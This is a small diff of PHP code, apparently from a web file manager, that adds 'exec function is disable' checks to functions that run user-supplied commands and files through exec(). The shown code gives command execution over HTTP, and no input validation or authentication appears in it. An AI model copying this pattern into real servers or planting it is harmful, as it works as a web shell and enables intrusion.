@@ -140,6 +140,10 @@ function download(){
 function execute_cmd(){
 	global $cmd;
 	header("Content-type: text/plain; charset=" . CHARSET_FILE);
+	if(!function_exists('exec')){
+		echo 'exec function is disable';
+		return;
+	}
 	$cmd = nameToSys($cmd);
 	if(strlen($cmd)){
 		echo "# " . $cmd . "\n";
@@ -161,7 +165,11 @@ function execute_cmd(){
 function execute_file(){
 	global $current_dir, $filename;
 	header("Content-type: text/plain");
-	$file = $current_dir . $filename;
+	if(!function_exists('exec')){
+		echo 'exec function is disable';
+		return;
+	}
+	$file = nameToSys($current_dir . $filename);
 	if(file_exists($file)){
 		echo "# " . $file . "\n";
 		exec($file, $mat);
